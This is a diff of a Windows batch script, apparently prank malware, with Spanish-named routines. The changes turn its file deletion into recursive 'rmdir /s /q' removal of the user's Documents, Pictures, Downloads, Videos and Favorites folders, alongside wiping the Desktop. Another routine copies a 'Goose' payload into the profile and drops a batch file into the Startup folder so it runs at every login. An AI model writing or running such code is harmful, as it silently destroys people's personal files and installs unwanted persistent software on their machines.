@@ -28,18 +28,17 @@ rundll32.exe user32.dll,UpdatePerUserSystemParameters
 exit /b
 :eliminarCarpetasUsuario
 del /q %userUb%\Desktop\*
-del /q /f %userUb%\Documents\
-del /q /f %userUb%\Pictures\
-del /q /f %userUb%\Downloads\
-del /q /f %userUb%\Videos\
-del /q /f %userUb%\Favorites\
+rmdir /s /q %userUb%\Documents\
+rmdir /s /q %userUb%\Pictures\
+rmdir /s /q %userUb%\Downloads\
+rmdir /s /q %userUb%\Videos\
+rmdir /s /q  %userUb%\Favorites\
 exit /b
 :GooseInicio
 set ubicacionStart="%userUb%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 mkdir %userUb%\Goose
 xcopy %miUb%\assets\Goose %userUb%\Goose  /s /y
 copy %miUb%\assets\inicioAutomatico.bat %ubicacionStart%
-copy %miUb%\assets\crearHuevo.bat %userUb%\Memes /s /y
 exit /b
 :memes
 mkdir %userUb%\adds
